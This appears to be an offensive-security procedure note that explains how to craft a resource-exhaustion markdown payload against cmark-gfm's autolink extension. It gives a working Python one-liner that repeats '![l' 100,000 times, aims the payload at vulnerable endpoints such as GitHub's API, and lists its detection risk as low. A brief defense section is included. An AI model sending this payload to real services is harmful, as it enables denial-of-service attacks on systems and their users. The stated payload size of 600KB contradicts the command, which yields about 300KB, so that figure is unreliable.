---
tags:
  - dos
  - payload-crafting
  - markdown
type: procedure
tools:
  - '[[tools/python3]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/generate-cmark-gfm-dos-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:32:39.295Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
id: a640e508-a291-4115-96ce-9899cabe3f4e
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Craft-Malicious-Markdown-Payload-for-cmark-gfm

## Summary

This procedure generates a malicious markdown payload that exploits the polynomial time complexity vulnerability in the autolink extension of cmark-gfm, causing excessive computation when processed.

## Description

The autolink extension in cmark-gfm versions prior to 0.29.0.gfm.6 processes certain repeated patterns, such as '![l' sequences, in a way that leads to O(n^2) time complexity, resulting in unbounded resource consumption for large inputs. This procedure creates a payload with 100,000 repetitions to demonstrate the issue, suitable for testing against vulnerable markdown parsers like GitHub's API.

## Requirements

1. Python 3 installed for string generation
2. Access to a text editor or file system to save the payload
3. Basic understanding of markdown syntax and string repetition

## Defense

Defensive measures and detection strategies:

- Patch cmark-gfm to version 0.29.0.gfm.6 or later
- Implement input size limits on markdown processing (e.g., max 10KB)
- Monitor for unusual CPU spikes in parsing services

## Objectives

1. Create a repeatable payload that triggers resource exhaustion
2. Prepare input for submission to vulnerable endpoints
3. Validate payload structure for exploit consistency

## Instructions

### Step 1: Generate the Payload String

**Context**: Use Python to repeat the triggering pattern '![l' many times, appending a newline to form valid markdown input.

**Command** ([[commands/generate-cmark-gfm-dos-payload]]):
```bash
python3 -c 'print("![l"* 100000 + "\n")'
```

> This command outputs a string approximately 600KB in size. Redirect to a file (e.g., > payload.txt) for later use. Expected output is the raw string; no errors if Python is available.

### Step 2: Save and Inspect Payload

**Context**: Store the output and verify its length to ensure sufficient repetitions for exhaustion.

**Command** (basic file operation):
```bash
python3 -c 'print("![l"* 100000 + "\n")' > payload.txt
wc -c payload.txt
```

> Confirms file size around 600,001 bytes. Success if length matches expected repetitions.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/generate-cmark-gfm-dos-payload]]

## Tools Used

- [[tools/python3]]

## Tags

- dos
- payload-crafting
